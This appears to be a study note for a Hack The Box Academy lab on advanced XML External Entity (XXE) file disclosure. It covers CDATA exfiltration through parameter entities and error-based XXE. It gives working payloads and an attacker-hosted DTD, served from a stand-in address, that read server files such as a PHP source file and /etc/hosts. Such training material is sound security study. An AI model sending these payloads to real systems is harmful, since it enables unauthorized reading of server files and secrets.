# Advanced File Disclosure - [LINK](https://academy.hackthebox.com/app/module/134/section/1206)

Advanced XML External Entity (XXE) techniques are required when basic file disclosure fails. This typically happens for two reasons: the target file contains XML-breaking characters (like source code, and `php://filter` isn't available), or the application does not reflect your input back to the screen (no output).

## 1. Advanced Exfiltration with CDATA (Parameter Entities)

To extract source code or binary data on non-PHP applications, you must wrap the exfiltrated data in XML CDATA tags (`<![CDATA[ ... ]]>`). This tells the parser to treat everything inside as raw text, preventing XML syntax errors.

Because XML parsers prohibit directly joining internal and external entities, you must bypass this restriction using **XML Parameter Entities** (entities starting with `%` used exclusively within DTDs) and host the concatenation logic on an external server.

1. **Host the External DTD:** Create the concatenation logic.
Create a file named `xxe.dtd` on your attack machine. This DTD concatenates three parameter entities (the start of the CDATA tag, the file contents, and the end of the CDATA tag).

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000

```


2. **Inject the Malicious Payload:** Define the parameter entities in the request.
Send the following XML payload to the vulnerable application. It defines the parameter entities, fetches your external DTD (which executes the concatenation), and then prints the final `&joined;` entity.

```xml
<!DOCTYPE email [
  <!-- Prepend the beginning of the CDATA tag -->
  <!ENTITY % begin "<![CDATA["> 
  
  <!-- Reference external file to exfiltrate -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  
  <!-- Append the end of the CDATA tag -->
  <!ENTITY % end "]]>"> 
  
  <!-- Reference your externally hosted DTD -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
  
  <!-- Execute the parameter entities -->
  %xxe;
]>
<root>
  <!-- Reference the final joined entity to print the file content -->
  <email>&joined;</email> 
</root>

```

## 2. Error-Based XXE

When the application does not reflect any XML elements to the screen, you are dealing with a blind situation. However, if the application displays verbose runtime errors (e.g., PHP parser errors), you can force the XML parser to crash and dump the file contents inside the error message.

**How it works:** You create a parameter entity that attempts to load a file path containing a non-existent entity *plus* the contents of your target file. When the parser tries to resolve this broken path, it crashes and prints the evaluated path (leaking the file data) to the screen.

1. **Test for Verbose Errors:**
Send malformed XML to the server (e.g., leave a tag unclosed like `<roo>` instead of `<root>`, or reference an undefined entity `&test;`). If the server returns a detailed parser error, it is vulnerable to Error-Based XXE.


2. **Host the Error-Triggering DTD:**
Create an `xxe.dtd` file on your attack host. This payload defines the file to read, and then creates an intentional error by referencing a junk entity (`%nonExistingEntity;`) concatenated with the file contents.

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

```

Serve it:

```bash
python3 -m http.server 8000

```


3. **Trigger the Error via the Request:**
Send the following minimal XML payload to the server. It fetches your external DTD and executes the `%error;` entity, causing the parser to crash and leak `/etc/hosts` in the HTTP response.

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<!-- No further XML body is needed -->

```


*Note: Error-Based XXE is highly effective for reading configuration files like `/etc/hosts` or `/etc/passwd`. However, it is less reliable for reading massive source code files, as the parser error output may have length limitations or still choke on specific special characters.*
